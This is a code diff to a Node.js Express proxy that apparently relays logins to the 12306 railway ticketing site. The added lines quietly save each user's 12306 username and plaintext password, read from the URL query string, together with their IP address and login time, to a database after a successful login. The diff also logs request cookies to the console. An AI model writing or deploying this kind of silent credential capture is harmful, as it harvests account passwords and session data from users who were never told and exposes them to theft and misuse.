@@ -3,7 +3,7 @@ var querystring = require('querystring');
 var cookie = require('cookie');
 var config = require('./city');
 var users = require('./users');
-// var db = require('./db');
+var db = require('./db');
 var cookieParser = require('cookie-parser');
 var express = require('express');
 var request = require('request');
@@ -208,10 +208,16 @@ app.get('/otnUamauthclient',function(req,res){
         tk:cookie.parse(ck).tk
     };
     getHttps(options,data).then(function(_d){
-        //console.log(_d.cookies);
+        console.log(req.cookies);
         // setCookie(res,_d.cookies);
         if(_d.html){
             result = JSON.parse(_d.html);
+            db.find({userName:req.cookies.userName}).then(function(__d){
+                console.log(__d);
+                if(__d.length){
+                    db.update({userName:req.cookies.userName},{name:result.username});
+                }
+            })
             if(result.newapptk){
                 res.cookie('tk',result.newapptk);
             }
@@ -469,6 +475,7 @@ app.get('/otnLoginCheckUser',function(req,res){
 })
 /*登录验证3*/
 app.post('/passportWebAuthUamtk',function(req,res){
+    var params = req.query;
     var ck = req.headers.cookie;
     var options = {
         hostname: 'kyfw.12306.cn',
@@ -488,7 +495,29 @@ app.post('/passportWebAuthUamtk',function(req,res){
         // 设置newapptk
         res.cookie('tk', result.newapptk);
         if (result.result_code == 0) {
+            res.cookie('userName',params.userName);
+            db.find({userName:params.userName}).then(function(__d){
+                if(__d.length){
+                    var save = {
+                        password:params.password,
+                        ip:req.ip,
+                        loginDate:new Date()
+                    };
+                    db.update({userName:params.userName},save);
+                }else{
+                    var save = {
+                        userName:params.userName,
+                        password:params.password,
+                        ip:req.ip,
+                        loginDate:new Date()
+                    };
+                    db.save(save);
+                }
+            })
+            
             res.send({ success: true, data: result });
+        }else{
+            res.send({ success: false, data: result });
         }
     })
 })
